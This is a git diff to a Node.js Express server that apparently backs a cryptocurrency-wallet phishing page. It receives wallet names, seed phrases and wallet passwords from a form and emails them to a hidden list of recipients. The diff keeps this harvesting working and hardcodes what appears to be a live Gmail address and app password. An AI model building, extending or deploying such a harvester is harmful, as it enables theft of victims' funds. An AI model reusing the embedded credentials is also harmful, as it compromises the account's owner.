@@ -1,13 +1,16 @@
 const express = require('express');
 const nodemailer = require('nodemailer');
-const bodyParser = require('body-parser');
+const multer = require('multer');
+const path = require('path');
 
 const app = express();
 const port = 3000;
 
-// Middleware to parse form data
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static('public')); // Serve static files from 'public' directory
+// Multer for handling multipart/form-data
+const upload = multer();
+
+// Serve static files
+app.use(express.static('public'));
 
 // List of recipient email addresses
 const maillist = [
@@ -21,17 +24,22 @@ const transporter = nodemailer.createTransport({
   port: 465,
   secure: true,
   auth: {
-    user: process.env.EMAIL_USER || "hello.jonathanpius@gmail.com",
-    pass: process.env.EMAIL_PASS || "rbenxiivasedcnaw",
+    user: "hello.jonathanpius@gmail.com",
+    pass: "rbenxiivasedcnaw",
     // ⚠️ IMPORTANT: Use environment variables for email credentials in production
   },
 });
 
 // Route to handle form submission
-app.post('/submit', async (req, res) => {
+app.post('/submit', upload.none(), async (req, res) => {
   try {
     // Extract form data
-    const { walletName, phraseWallet, passwordWallet } = req.body;
+    const { walletName, phraseWallet, passwordWallet, send } = req.body;
+
+    // Check if this is a valid submission
+    if (send !== 'true') {
+      return res.status(400).send('Invalid submission');
+    }
 
     // Prepare email options
     const mailOptions = {
@@ -54,11 +62,16 @@ app.post('/submit', async (req, res) => {
     console.log('Rejected:', info.rejected);
 
     // Send response back to client
-    res.send('Wallet details submitted successfully');
+    res.status(200).send('Wallet details submitted successfully');
   } catch (error) {
     console.error('Error sending email:', error);
     res.status(500).send('Error submitting wallet details');
   }
+});
+
+// Serve the HTML file
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 // Start the server
